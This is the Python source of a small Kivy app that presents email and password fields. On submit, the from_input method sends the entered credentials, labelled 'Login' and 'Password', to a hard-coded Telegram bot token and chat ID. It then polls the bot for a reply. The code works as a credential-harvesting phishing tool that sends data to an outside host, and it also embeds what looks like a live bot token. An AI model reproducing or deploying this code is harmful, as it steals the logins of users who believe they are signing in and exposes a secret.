from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.network.urlrequest import UrlRequest
from kivy.core.window import Window
from kivy.uix.anchorlayout import AnchorLayout
from kivy.uix.label import Label
import certifi
from urllib.parse import urlencode
from kivy.uix.image import Image
from kivy.lang import Builder

Window.clearcolor = (0.859, 0.859, 0.859, 1)

class RotatedImage(Image):
    angle = 15


class My(App):
    def from_input(self, *args):
        data = "*Login:* " + "`" + self.root.ids.email.text + "`" + "\n*Password:* " + "`" + self.root.ids.password.text + "`"
        data = urlencode({'text': data})
        self.r = UrlRequest(
            f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/sendMessage?chat_id"
            f"=888281527&{data}&parse_mode=MarkdownV2", self.safe, ca_file=certifi.where())

    def safe(self, *args):
        self.last = self.r.result['result']['message_id'] + 1
        self.make_request()

    def make_request(self):
        self.r = UrlRequest(f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/getUpdates?offset=-1",
                            self.prr)

    def prr(self, *args):
        if self.r.result['result'][0]['message']['message_id'] == self.last:
            print(self.r.result['result'][0]['message']['text'])
        else:
            self.make_request()


if __name__ == '__main__':
    My().run()
